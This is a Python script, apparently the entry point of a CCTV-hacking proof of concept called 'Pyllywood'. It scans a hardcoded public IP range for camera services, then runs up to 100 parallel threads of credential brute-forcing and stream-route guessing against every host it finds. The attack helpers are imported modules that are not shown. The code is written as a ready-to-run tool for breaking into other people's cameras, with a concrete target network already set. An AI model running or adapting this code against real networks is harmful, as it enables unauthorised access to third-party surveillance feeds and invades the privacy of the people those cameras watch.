import pyfiglet #pip
from colorama import init
from termcolor import colored
import sys, threading, os, time, json
from libs import getports as gp
from libs import attack_creds_first as attack
from libs import attack_routes_first as routeattack

init()
ascii_banner = pyfiglet.figlet_format("Pyllywood.")
print("{}\n{}\n\n".format(ascii_banner, "Hollywood-style CCTV hacking - PoC"))

gp.discover('79.11.64.71/24')
print(colored("[*] Waiting for threads to finish...", 'yellow'))
time.sleep(10)

totalPortCount = 0
portScanResults = gp.targetList
for target in portScanResults:
    for port in portScanResults[target]:
        totalPortCount += 1

if totalPortCount == 0:
    print(colored("[!] No targets found. Try a different network.", 'red'))
    sys.exit(0)

print(colored("[*] Found {} targets with a total of {} ports".format(len(portScanResults), totalPortCount), 'yellow'))
print(colored("[*] All targets that do NOT require authentication will be excluded - these are not supported yet", 'yellow'))
print(colored("[*] Starting credentials and routes attacks. Please be patient...", 'cyan'))

for target in portScanResults:
    for port in portScanResults[target]:
        if portScanResults[target][port] == None:
            thread = threading.Thread(target = routeattack.findValidRoutes, args = (target, port))
            thread.start()
            if threading.active_count() == 100:
                thread.join()
        else:
            thread = threading.Thread(target = attack.attackCredentials, args = (target, port, portScanResults[target][port]))
            thread.start()
            if threading.active_count() == 100:
                thread.join()
